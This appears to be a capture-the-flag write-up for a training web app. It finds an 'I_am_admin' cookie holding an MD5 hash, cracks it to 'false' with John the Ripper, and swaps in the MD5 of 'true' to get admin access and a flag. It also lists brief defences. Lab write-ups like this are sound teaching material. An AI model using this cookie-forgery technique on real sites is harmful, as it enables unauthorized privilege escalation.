Vulnerability name:

How to defend: HTTP-only cookie, secure hash (MD5 is outdated), server side auth, better auth logic

cookie I_am_admin

cookie value is "68934a3e9455fa72420237eb05902327"
suspiciously looks like MD5 again

and lo and behold

```

../john/run/john --format=Raw-MD5 i_am_admin_cookie
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 19 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-21 17:25) 0g/s 102000p/s 102000c/s 102000C/s Cookie1921..Cookie1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
false (cookie)
1g 0:00:00:00 DONE 2/3 (2024-11-21 17:25) 7.692g/s 3206Kp/s 3206Kc/s 3206KC/s leticia22..qwzxas
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.

```

so the cookie value is false

replacing it with true in md5 and clicking on home

and we get

```

Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

```
